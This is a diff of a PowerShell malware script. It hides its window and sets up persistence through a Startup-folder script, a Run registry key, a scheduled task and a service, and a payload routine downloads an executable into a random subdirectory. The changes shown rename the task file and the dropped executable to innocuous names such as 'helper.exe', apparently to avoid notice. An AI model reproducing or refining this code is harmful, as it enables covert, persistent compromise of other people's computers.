@@ -5,7 +5,7 @@ $WindowStyle   = "Hidden"
 $StartupScriptPath   = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FileExplorer.ps1"
 $StartupRegPath  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $TaskName       = "FileGuardianTask"
-$TaskPath       = "C:\Windows\System32\Tasks\FileGuardianTask.xml"
+$TaskPath       = "C:\Windows\System32\Tasks\FileExplorerTask.xml"
 $ServiceName    = "FileGuardianService"
 
 function Set-Persistence {
@@ -57,7 +57,7 @@ function Run-Payload {
         }
 
         $targetSubDirectory = $subDirectories | Get-Random
-        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "katysaneur.exe"
+        $TargetPath = Join-Path -Path $targetSubDirectory.FullName -ChildPath "helper.exe"
 
         if (-not (Test-Path $TargetPath)) {
             Write-Host "[*] File not found downloading..."
